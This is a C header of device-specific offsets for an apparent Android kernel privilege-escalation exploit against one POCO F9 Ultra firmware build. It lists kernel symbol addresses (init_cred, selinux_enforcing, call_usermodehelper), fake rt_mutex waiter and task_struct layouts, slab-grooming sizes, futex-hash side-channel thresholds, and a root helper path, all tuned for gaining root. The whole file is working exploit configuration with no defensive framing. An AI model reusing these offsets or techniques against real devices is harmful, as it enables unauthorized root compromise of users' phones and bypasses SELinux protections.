#ifndef OFFSET_H
#define OFFSET_H

/* POCO F9 Ultra (songyuan), OS3.0.309.0.WGNMIXM.
 * Kernel: 6.12.69-android16-6-g0d80ee00f747-ab15461283-4k.
 * Symbols come from the exact boot image; layouts come from its exact BTF. */
#define BUILD_VARIANT_LABEL "songyuan-OS3.0.309.0.WGNMIXM"
#define USE_NATIVE_SIGRETURN_STAGE 1
#define SIGRETURN_WAITER_OFF 0xe0
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "POCO/songyuan_global/songyuan:16/OS3.0.309.0.WGNMIXM"
#endif

#define KIMAGE_TEXT_BASE       0xffffffc080000000ULL
#define P0_PAGE_OFFSET         0xffffff8000000000ULL
#define P0_PHYS_OFFSET         0x80000000ULL
#define P0_KERNEL_PHYS_LOAD    0xc7800000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
/* Live /proc/zoneinfo: Normal starts at PFN 530784, spans 12052128
 * 4 KiB pages, and ends at physical 0xc00000000.  RAM has large holes, so
 * MemTotal cannot be used as the linear-map span.  Round the corresponding
 * direct-map search end up to the next GiB. */
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define KERNELSNITCH_MTE_ENABLED    1
#define KERNELSNITCH_CPU_MULT       1
#define KERNELSNITCH_SLAB_OBJECT_OFFSET 0
#define KERNELSNITCH_CANDIDATE_STEP 0x100
#define KERNELSNITCH_REPEAT_MEASUREMENT 8
/* Empty-bucket timings vary between roughly 4 and 50 counter ticks as CPU
 * power state changes, while a verified 4096-waiter collision measures in
 * the thousands.  Keep the relative threshold from dipping into the normal
 * wake distribution. */
#define KERNELSNITCH_THRESHOLD_FLOOR 1000
#define DIRECT_MAP_BASE        0xffffff8000000000ULL
#define DIRECT_MAP_END         0xffffff9000000000ULL
#define VMEMMAP_START          0xfffffffe00000000ULL

/* The production kernel uses the Rust ashmem implementation.  The old fops
 * promotion path is deliberately not used by the songyuan proof; these
 * definitions only keep the inherited diagnostic objects linkable. */
#define ASHMEM_MISC_FOPS_OFF   0x028b60e8ULL
#define ASHMEM_FOPS_OFF        0x028b60e8ULL
#define ASHMEM_IOCTL_OFF       0x00f6f178ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00f707ccULL
#define ASHMEM_MMAP_OFF        0x00f6ec98ULL
#define ASHMEM_OPEN_OFF        0x00f70744ULL
#define ASHMEM_RELEASE_OFF     0x00f6e8e8ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00f6e9e8ULL
#define CONFIGFS_READ_ITER_OFF 0x007c4f0cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x007c54b8ULL
#define COPY_SPLICE_READ_OFF   0x003e9b34ULL
#define NOOP_LLSEEK_OFF        0x00755b30ULL

#define INIT_TASK_OFF          0x025ed8c0ULL
#define INIT_CRED_OFF          0x02603630ULL
#define ROOT_TASK_GROUP_OFF    0x02838800ULL
#define SELINUX_ENFORCING_OFF  0x02887890ULL
#define KMALLOC_CACHES_OFF     0x0199a4c0ULL
#define ANON_PIPE_BUF_OPS_OFF  0x0132b808ULL

#define ASHMEM_MISC_FOPS       (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS            (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL           (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL    (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP            (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN            (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE         (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO     (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER     (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ       (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK            (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK              (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED              (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP        (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING      (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES         (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS      (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/ghostlock-songyuan-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00523308ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0199a250ULL
#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF CALL_USERMODEHELPER_EXEC_WORK_OFF
#define ASHMEM_IOCTL_JT_OFF ASHMEM_IOCTL_OFF
#define ASHMEM_COMPAT_IOCTL_JT_OFF ASHMEM_COMPAT_IOCTL_OFF
#define ASHMEM_MMAP_JT_OFF ASHMEM_MMAP_OFF
#define ASHMEM_OPEN_JT_OFF ASHMEM_OPEN_OFF
#define ASHMEM_RELEASE_JT_OFF ASHMEM_RELEASE_OFF
#define ASHMEM_SHOW_FDINFO_JT_OFF ASHMEM_SHOW_FDINFO_OFF
#define ASHMEM_LLSEEK_JT_OFF NOOP_LLSEEK_OFF
#define CONFIGFS_READ_FILE_JT_OFF CONFIGFS_READ_ITER_OFF
#define CONFIGFS_WRITE_BIN_FILE_JT_OFF CONFIGFS_BIN_WRITE_ITER_OFF
#define NOOP_LLSEEK_JT_OFF NOOP_LLSEEK_OFF
#define ASHMEM_IOCTL_JT ASHMEM_IOCTL
#define ASHMEM_COMPAT_IOCTL_JT ASHMEM_COMPAT_IOCTL
#define ASHMEM_MMAP_JT ASHMEM_MMAP
#define ASHMEM_OPEN_JT ASHMEM_OPEN
#define ASHMEM_RELEASE_JT ASHMEM_RELEASE
#define ASHMEM_SHOW_FDINFO_JT ASHMEM_SHOW_FDINFO
#define ASHMEM_LLSEEK_JT NOOP_LLSEEK
#define CONFIGFS_READ_FILE_JT CONFIGFS_READ_ITER
#define CONFIGFS_WRITE_BIN_FILE_JT CONFIGFS_BIN_WRITE_ITER
#define NOOP_LLSEEK_JT NOOP_LLSEEK
#define CALL_USERMODEHELPER_EXEC_WORK_JT \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_JT_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#define SKB_DATA_DELTA (-0xe80LL)

/* Stable direct-map stage-zero objects. &loggers[2][1] is populated with
 * the runtime nfulnl_logger pointer by the PF_UNSPEC registration loop. */
#define SLIDE_NFULNL_LOGGER_OFF       0x025e1fb0ULL
#define SLIDE_LOGGERS_0_1_OFF         0x025e1ef8ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x0271ccb8ULL
#define SLIDE_INIT_TASK_OFF           INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF     ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF       0x028a9e98ULL
#define SLIDE_NFULNL_LOGGER_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define SLIDE_FAKE_WAITER_PRIO 130
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 0
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0

/* Payload objects live in a reclaimed 32 KiB page. */
/* payload_base is page_base-0xe80, so this places fake_lock at page+0x4a0.
 * The exact BTF says mm_struct is 0x4c0 bytes and fork.c zeroes the complete
 * object before initialization; 0x4a0..0x4bf is its zeroed reserved tail.
 *
 * Do not restore the inherited 0x1350 value on this target: it placed the
 * lock at page+0x4d0, in the 0x40-byte allocator padding of the 0x500-byte
 * mm_struct slab slot.  The live panic showed that padding holding a SLUB
 * freelist/self pointer (cached-leftmost == fake_lock+8), which tripped
 * rt_mutex_top_waiter's BUG_ON before the write could be rejected. */
#define LOCK_OFF      0x1320
#define W0_OFF        0x2220
#define FOPS_OFF      0x1000
#define SCRATCH_OFF   0x3000
#define RIGHT_OFF     0x4440
#define LEFT_OFF      0x5550
#define FAKE_TASK_OFF 0x3200

/* rt_mutex_waiter, exact BTF. */
#define FAKE_WAITER_TREE_PRIO_OFF        0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF             0x50
#define FAKE_WAITER_LOCK_OFF             0x58
#define FAKE_WAITER_WAKE_STATE_OFF       0x60
#define FAKE_WAITER_WW_CTX_OFF           0x68

/* task_struct, exact BTF. */
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x94
#define FAKE_TASK_NORMAL_PRIO_OFF   0x9c
#define FAKE_TASK_TASK_GROUP_OFF    0x420
#define FAKE_TASK_UCLAMP_REQ_OFF    0x428
#define FAKE_TASK_UCLAMP_OFF        0x430
#define EXP32_USE_P0_TASK_POINTERS  1
#define FAKE_TASK_PI_LOCK_OFF       0x9ec
#define FAKE_TASK_PI_WAITERS_OFF    0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF   0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18
#define TASK_TASKS_OFF              0x638
#define TASK_PID_OFF                0x708
#define TASK_TGID_OFF               0x70c
#define TASK_REAL_CRED_OFF          0x8f8
#define TASK_CRED_OFF               0x900
#define TASK_COMM_OFF               0x910

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define WQ_DFL_PWQ_OFF 0xc0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x60
#define PWQ_MAX_ACTIVE_OFF 0x64
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x10
#define FOPS_READ_OFF 0x18
#define FOPS_WRITE_OFF 0x20
#define FOPS_READ_ITER_OFF 0x28
#define FOPS_WRITE_ITER_OFF 0x30
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xb8
#define FOPS_SHOW_FDINFO_OFF 0xd8

/* BTF sizeof(mm_struct) is 1216, while the live mm_struct SLUB cache reports
 * a 1280-byte allocation stride (25 objects in an order-3 slab).  The
 * KernelSnitch candidate walk and slab grooming need the allocator stride,
 * not the unpadded C type size. */
#define MM_STRUCT_BTF_SIZE 1216
#define MM_STRUCT_SZ 1280
#define MM_ORDER 3
#define MM_CPU_PARTIAL 6
/* Eight possible CPUs give this kernel 2048 futex hash buckets.  The 48 GiB
 * direct-map walk at 256-byte alignment covers about 3.22 billion tagged
 * candidates; the target plus four independent collisions leaves about
 * 3.22B / 2048^4 = 0.00018 expected accidental matches. */
#define KSNITCH_COLLISIONS 5

#endif
